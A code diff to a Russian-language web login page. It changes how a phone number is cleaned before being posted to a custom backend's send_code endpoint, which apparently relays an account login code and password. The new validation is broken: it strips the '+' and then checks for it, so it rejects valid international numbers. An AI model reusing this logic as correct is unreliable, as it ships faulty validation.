@@ -595,56 +595,49 @@ function formatPhoneNumber() {
         
 async function sendCode() {
     const phoneInput = document.getElementById('phone-input');
-    let phone = phoneInput.value;
+    let phone = phoneInput.value.replace(/\D/g, '');
     
-    // Очищаем номер: оставляем только + и цифры
-    phone = phone.replace(/[^\d\+]/g, '');
-    
-    // Если нет плюса в начале, добавляем
-    if (!phone.startsWith('+')) {
-        phone = '+' + phone;
-    }
-    
-    // Проверяем формат
-    if (!phone || phone.length < 9) {
-        showError('phone', 'Введите полный номер телефона с кодом страны');
+    // Добавляем +7 только если пользователь ввел 10 цифр
+    if (phone.length === 10) {
+        phone = '+7' + phone;
+    } else if (!phone.startsWith('+')) {
+        showError('phone', 'Введите номер в международном формате (например, +79123456789)');
         return;
     }
     
-    if (!/^\+\d{8,}$/.test(phone)) {
-        showError('phone', 'Номер должен содержать код страны (+) и не менее 8 цифр');
+    if (!phone || phone.length < 8) {
+        showError('phone', 'Введите корректный номер телефона');
         return;
     }
     
     authData.phone = phone;
     showLoading('Отправка кода...');
-            
-            try {
-                const response = await fetch(`${API_BASE_URL}/send_code`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone })
-                });
-                
-                const data = await response.json();
-                
-                if (data.success) {
-                    authData.phoneCodeHash = data.phone_code_hash;
-                    document.getElementById('code-phone-display').textContent = formatPhoneForDisplay(phone);
-                    document.getElementById('password-phone-display').textContent = formatPhoneForDisplay(phone);
-                    hideLoading();
-                    changeStep('code');
-                } else {
-                    hideLoading();
-                    showError('phone', data.error || 'Ошибка при отправке кода');
-                }
-            } catch (error) {
-                hideLoading();
-                showError('phone', 'Ошибка соединения с сервером. Проверьте API_BASE_URL.');
-                console.error('Ошибка:', error);
-            }
-        }
+    
+    try {
+        const response = await fetch(`${API_BASE_URL}/send_code`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone })
+        });
         
+        const data = await response.json();
+        
+        if (data.success) {
+            authData.phoneCodeHash = data.phone_code_hash;
+            document.getElementById('code-phone-display').textContent = formatPhoneForDisplay(phone);
+            document.getElementById('password-phone-display').textContent = formatPhoneForDisplay(phone);
+            hideLoading();
+            changeStep('code');
+        } else {
+            hideLoading();
+            showError('phone', data.error || 'Ошибка при отправке кода');
+        }
+    } catch (error) {
+        hideLoading();
+        showError('phone', 'Ошибка соединения с сервером. Проверьте API_BASE_URL.');
+        console.error('Ошибка:', error);
+    }
+}
         async function verifyCode() {
             const codeInput = document.getElementById('code-input');
             const code = codeInput.value.replace(/\D/g, '');
@@ -732,7 +725,7 @@ async function sendCode() {
         
         function viewStatistics() {
             // Перенаправляем на страницу статистики
-            window.location.href = 'dashboard.html?phone=' + encodeURIComponent(authData.phone);
+            window.location.href = 'stats.html?phone=' + encodeURIComponent(authData.phone);
         }
         
         function togglePasswordVisibility() {
@@ -760,6 +753,7 @@ async function sendCode() {
 </body>
 
 </html>
+
 
 
 
